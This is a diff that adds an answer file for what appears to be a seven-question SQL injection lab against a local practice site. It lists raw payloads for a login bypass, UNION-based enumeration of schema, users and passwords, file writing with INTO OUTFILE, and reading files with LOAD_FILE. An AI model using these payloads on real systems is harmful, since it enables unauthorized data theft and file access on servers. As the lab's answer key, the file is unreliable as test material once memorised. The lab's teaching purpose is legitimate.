@@ -1,0 +1,48 @@
+Question 1:
+alice') --
+
+
+
+Question 2:
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 4 --
+' ORDER BY 8 -- 	[ERROR!]
+' ORDER BY 5 -- 	[BINGO!]
+' UNION SELECT 1,2,3,4,5 -- 	[1 is not displayed, then use other]
+' UNION SELECT 1,database(),version(),user(),@@hostname --
+
+
+
+Question 3:
+' UNION SELECT 1,2,3,table_name,column_name FROM information_schema.columns -- 
+' UNION SELECT 1,username,password,description,fname FROM users WHERE username='voldemort'; -- 
+
+
+
+Question 4:
+' UNION SELECT 1,2,table_name,table_type,5 FROM information_schema.tables -- 
+' UNION SELECT 1,2,3,table_name,column_name FROM information_schema.columns -- 
+' UNION SELECT 1,2,3,cyberId,cyberHour FROM cyber_tableAAAAAAAAAAAAA -- 
+
+
+
+Question 5:
+http://localhost:8000/blindsqli.php?user=' UNION SELECT 1,2,3,4,5 -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',TABLE_NAME,TABLE_ROWS,'','' FROM information_schema.TABLES WHERE TABLE_SCHEMA='secure' -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',count(*),'','','' FROM information_schema.columns WHERE TABLE_SCHEMA='secure' -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',column_name,'','','' FROM information_schema.columns WHERE TABLE_SCHEMA='secure' AND column_name!='id' -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',id,random,'','' FROM secure.789b05678e7f955d2cf125b0c05616c9 WHERE id=1 -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',id,random,'','' FROM secure.789b05678e7f955d2cf125b0c05616c9 WHERE id=2 -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '',id,random,'','' FROM secure.789b05678e7f955d2cf125b0c05616c9 WHERE id=3 -- /
+
+
+
+Question 6:
+http://localhost:8000/blindsqli.php?user=' UNION SELECT 'Hello, World', '', '', '', '' INTO OUTFILE '/home/hello_world.txt' -- 
+
+
+
+Question 7:
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '','','','',LOAD_FILE('/home/flag.txt') -- /
+http://localhost:8000/blindsqli.php?user=' UNION SELECT '','','','',HEX(LOAD_FILE('/home/flag.txt')) -- .
